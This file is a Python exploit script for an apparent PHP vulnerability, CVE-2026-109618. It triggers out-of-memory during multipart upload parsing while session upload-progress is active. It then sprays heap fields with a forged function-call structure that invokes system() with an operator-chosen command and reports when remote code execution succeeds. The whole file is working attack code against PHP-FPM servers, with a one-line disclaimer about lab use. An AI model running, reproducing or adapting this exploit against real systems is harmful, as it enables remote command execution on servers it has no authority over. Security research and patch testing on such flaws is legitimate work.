#!/usr/bin/env python3
"""
CVE-2026-109618 -- OOM during multipart parsing with session progress active

Triggers OOM in the rfc1867 multipart parser while session.upload_progress
is tracking the upload. Before the patch, longjmp/bailout skips cleanup of
the progress data structures (zvals, var_hash, file metadata). RSHUTDOWN
then runs cleanup on these half-initialized structures, causing UAF.

This script tests whether the FPM worker crashes or produces anomalous
behavior when OOM hits during active progress tracking.

For authorized security research and local lab use only.
"""

import argparse
import socket
import struct
import sys
import time


def make_part(boundary, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build_oom_with_progress(session_id, boundary, field_count, field_size,
                            spray_count, spray_value, stall_point):
    """Build a multipart body that:
    1. Activates session progress tracking
    2. Starts a file upload (triggers progress caching)
    3. Stalls to allow first progress update
    4. Sends enough data to trigger OOM during continued parsing
    5. Includes spray fields to reclaim freed structures
    """
    # Phase 1: activate progress + start file upload
    seg1 = b""
    seg1 += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"exploit") + b"\r\n"
    seg1 += make_part(boundary, "f", b"", filename="upload.bin") + b"\r\n"
    # File data: enough for first progress update to fire (>1% of total)
    seg1 += b"A" * 8192

    # Phase 2: trigger OOM + spray
    seg2 = b""
    # Continue file data briefly
    seg2 += b"B" * 4096 + b"\r\n"
    # Close file "f"
    # Now blast OOM-triggering fields: many large values exhaust memory_limit
    for i in range(field_count):
        seg2 += make_part(boundary, f"oom{i}", b"X" * field_size) + b"\r\n"
    # Spray fields AFTER OOM point: these may reclaim freed progress arData
    if spray_count > 0 and spray_value:
        for i in range(spray_count):
            seg2 += make_part(boundary, "t[]", spray_value) + b"\r\n"
    # Second file to trigger FILE_DATA through progress handler after spray
    seg2 += make_part(boundary, "g", b"D" * 64, filename="probe.bin") + b"\r\n"
    seg2 += b"--" + boundary + b"--\r\n"

    return seg1, seg2


def forge_fcall(call_addr, cmd):
    """Forge zend_fcall_info + zend_internal_function in 288 bytes."""
    buf = bytearray(288)
    struct.pack_into("<Q", buf, 0, 64)       # fci.size
    struct.pack_into("<Q", buf, 8, call_addr) # fci.function_name (misused as call target)
    struct.pack_into("<I", buf, 16, 0x106)    # IS_STRING_EX
    struct.pack_into("<I", buf, 48, 1)        # param_count
    struct.pack_into("<B", buf, 64, 1)        # ZEND_INTERNAL_FUNCTION
    struct.pack_into("<Q", buf, 152, call_addr)  # handler
    struct.pack_into("<I", buf, 160, 0x308)   # IS_OBJECT_EX
    payload = b"system\x00" + cmd.encode() + b"\x00"
    buf[200:200 + min(len(payload), 80)] = payload[:80]
    return bytes(buf)


def send_request(host, port, path, session_id, seg1, seg2, boundary, stall):
    total = len(seg1) + len(seg2)
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={session_id}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {total}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    try:
        sock.connect((host, port))
        sock.sendall(headers + seg1)
        print(f"    Seg1 sent ({len(seg1)}B), stalling {stall}s for progress update...",
              flush=True)
        time.sleep(stall)
        sock.sendall(seg2)
        print(f"    Seg2 sent ({len(seg2)}B), reading response...", flush=True)

        sock.settimeout(15)
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return str(e).encode()


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618: OOM during multipart parsing with progress tracking")
    ap.add_argument("cmd", nargs="?", default="id",
                    help="Command to execute (default: id)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8898)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--sid", default="php2shell-oom")
    ap.add_argument("--stall", type=float, default=1.5,
                    help="Seconds between segments (>1s for progress update)")
    ap.add_argument("--fields", type=int, default=500,
                    help="Number of OOM-triggering fields")
    ap.add_argument("--field-size", type=int, default=65536,
                    help="Size of each OOM field value")
    ap.add_argument("--spray", type=int, default=149,
                    help="Number of spray fields (0 to disable)")
    ap.add_argument("--base", default="",
                    help="PHP binary base address (hex)")
    ap.add_argument("--call", default="",
                    help="zend_call_function address (hex)")
    ap.add_argument("--attempts", type=int, default=5)
    args = ap.parse_args()

    # Compute call address for spray
    call_addr = 0
    if args.call:
        call_addr = int(args.call, 0)
    elif args.base:
        call_addr = int(args.base, 0) + 0x6506f0

    boundary = b"php2shell618"
    marker = "PHP2SHELL_RCE"
    full_cmd = f"{args.cmd}; echo {marker}"
    spray_value = forge_fcall(call_addr, full_cmd) if call_addr else b"S" * 288

    est_mb = (args.fields * args.field_size) / (1024 * 1024)
    print("=" * 60)
    print("CVE-2026-109618: OOM + Progress Tracking Exploit")
    print("=" * 60)
    print(f"  Target:      http://{args.host}:{args.port}{args.path}")
    print(f"  Command:     {args.cmd}")
    print(f"  OOM fields:  {args.fields} x {args.field_size}B (~{est_mb:.0f}MB)")
    print(f"  Spray:       {args.spray} x 288B -> 320-byte bin")
    if call_addr:
        print(f"  Call addr:   {hex(call_addr)}")
    else:
        print(f"  Call addr:   none (crash test only)")
    print(f"  Stall:       {args.stall}s")
    print()

    for attempt in range(1, args.attempts + 1):
        sid = f"{args.sid}-{attempt}"
        seg1, seg2 = build_oom_with_progress(
            sid, boundary, args.fields, args.field_size,
            args.spray, spray_value, args.stall)

        print(f"[{attempt}/{args.attempts}] sid={sid}")
        print(f"    Seg1: {len(seg1)}B, Seg2: {len(seg2)}B, Total: {len(seg1)+len(seg2)}B")

        resp = send_request(args.host, args.port, args.path, sid,
                           seg1, seg2, boundary, args.stall)

        if not resp:
            print("    [!] Empty response -- worker crash or connection reset")
            print()
            continue

        status_line = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
        print(f"    Status: {status_line}")
        print(f"    Body: {len(body)} bytes")

        if b"502" in resp[:30] or b"503" in resp[:30]:
            print("    [!] 502/503 -- FPM worker crashed during request")
        elif b"Allowed memory size" in body:
            print("    [+] OOM confirmed in response")
        elif marker.encode() in body or b"uid=" in body:
            print()
            print("    [+] RCE CONFIRMED")
            idx = body.find(b"uid=")
            if idx < 0:
                idx = body.find(marker.encode())
            if idx >= 0:
                print(body[max(0, idx - 40):idx + 200].decode("latin-1", "replace"))
            return 0
        elif len(body) == 0:
            print("    [!] Empty body -- possible worker crash")
        elif len(body) < 1000:
            print(f"    Body preview: {body[:200]}")
        else:
            print(f"    Normal response ({len(body)}B)")

        # Check for anomalous cookies (memory disclosure)
        for line in resp.split(b"\r\n"):
            if line.lower().startswith(b"set-cookie:") and b"PHPSESSID=" in line:
                cookie_val = line.split(b"PHPSESSID=")[1].split(b";")[0]
                if len(cookie_val) > 40:
                    print(f"    [!] Anomalous PHPSESSID cookie ({len(cookie_val)} bytes)")
                    print(f"        {cookie_val[:80]}")
        print()

    print("[*] Done.")
    print("    Check: sg docker -c \"docker logs lab-php-1 2>&1 | tail -20\"")
    return 1


if __name__ == "__main__":
    sys.exit(main())
